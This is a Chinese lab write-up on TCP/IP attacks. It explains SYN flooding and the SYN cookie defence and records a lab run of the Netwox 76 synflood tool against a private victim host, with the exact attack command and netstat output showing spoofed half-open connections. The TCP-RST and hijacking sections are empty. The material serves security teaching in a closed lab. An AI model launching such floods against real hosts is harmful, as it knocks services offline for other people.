## TCP-IP攻击

### 概述

### 实验环境

1. 三台Linux系统主机,一台作为攻击者,一台作为受害者,一台作为观察者.
2. 为了简化TCP序列号和源端口号的“猜测”,实验处于同一局域网内,你可以使用嗅探器来获取受害者信息.



### SYN-Flooding攻击
1. SYN-Flooding攻击原理

SYN-Flooding是DoS攻击的一种，攻击者向受害者的TCP端口发送很多SYN请求，但攻击者无意完成三次握手过程.  
攻击者要么使用欺骗性的假的IP地址，要么不要继续完成整个三次握手过程.  
通过这种攻击，攻击者可以淹没用于半连接的受害者队列，即已完成SYN，SYN-ACK但尚未得到最终ACK的连接.  
当这个队列已满时，受害者不能再进行任何连接.  

正常三次握手过程:  
```
client  ---  service
SYN     -->
        <--  SYN-ACK
ACK     ---> 
```
在Linux中，我们可以使用以下命令检查  
命令：`＃sysctl -q net.ipv4.tcp_max_syn_backlog`  
```
root@gt:/home/git/Keep-learning/mySeedLab# sysctl -q net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 512
```
我们可以使用命令“netstat -na”来检查队列的使用情况，即与监听端口相关联的半连接的数量.  
这种半连接的状态是SYN-RECV。如果三次握手完成，则连接的状态将为ESTABLISHED.  

在这个任务中，你需要演示SYN-Flooding攻击:  
您可以使用Netwox来执行攻击，然后使用嗅探器捕获攻击性数据包.  
在攻击发生时，在受害机器上运行“netstat -na”命令，并将结果与攻击前的结果进行比较.  

2. Netwox 76简介

```
标题：Synflood
用法：netwox 76 -i ip -p port [-s spoofip]
参数：
-i | --dst-ip ip 目标IP地址
-p | --dst-port port 目标端口号
-s | --spoofip spoofip IP欺骗初始化类型
```
3. SYN Cookie防御机制

如果你的攻击看起来不成功，你可以检查是否启用了SYN cookie机制.  
SYN cookie是抵抗SYN-Flooding的防御机制.  

防御原理简介:  
在TCP服务器收到TCP SYN包并返回TCP SYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值.  
在收到TCP ACK包时，TCP服务器在根据那个cookie值检查这个TCP ACK包的合法性.  
如果合法，再分配专门的数据区进行处理未来的TCP连接.  

你可以使用sysctl命令打开/关闭SYN cookie机制：  
```
＃sysctl -a | grep cookie（显示SYN cookie标志）
＃sysctl -w net.ipv4.tcp_syncookies = 0（关闭SYN cookie）
＃sysctl -w net.ipv4.tcp_syncookies = 1（打开SYN cookie）
```

4. 实验结果分析

```
攻击者:192.168.59.1
受害者:192.168.59.144

攻击者终端对受害者进行SYN-Flooding打击:
# netwox 76 -i 192.168.59.144 -p 80
```
实验现象:受害者系统出现卡死状态.  
比较`netstat -na`前后状态如下:  
产生大量的TCP半连接,阻塞了队列,导致后续正常TCP连接无法建立!!  
```
[04/17/2018 16:41] seed@ubuntu:~$ diff 1.txt 2.txt 
5a6,261
> tcp        0      0 192.168.59.144:80       253.138.146.184:9358    SYN_RECV   
> tcp        0      0 192.168.59.144:80       246.55.107.172:50273    SYN_RECV   
> tcp        0      0 192.168.59.144:80       196.23.102.181:5583     SYN_RECV   
> tcp        0      0 192.168.59.144:80       242.22.15.17:45979      SYN_RECV   
> tcp        0      0 192.168.59.144:80       246.166.91.206:61644    SYN_RECV   
> tcp        0      0 192.168.59.144:80       249.212.122.218:23424   SYN_RECV   
> tcp        0      0 192.168.59.144:80       251.32.218.10:56419     SYN_RECV   
> tcp        0      0 192.168.59.144:80       248.235.192.194:41439   SYN_RECV   
> tcp        0      0 192.168.59.144:80       241.118.133.147:19187   SYN_RECV   
> tcp        0      0 192.168.59.144:80       242.23.168.166:21253    SYN_RECV   
> tcp        0      0 192.168.59.144:80       247.207.89.108:45839    SYN_RECV  
> ...........................................................................

```

### TCP-RST攻击


### TCP会话劫持





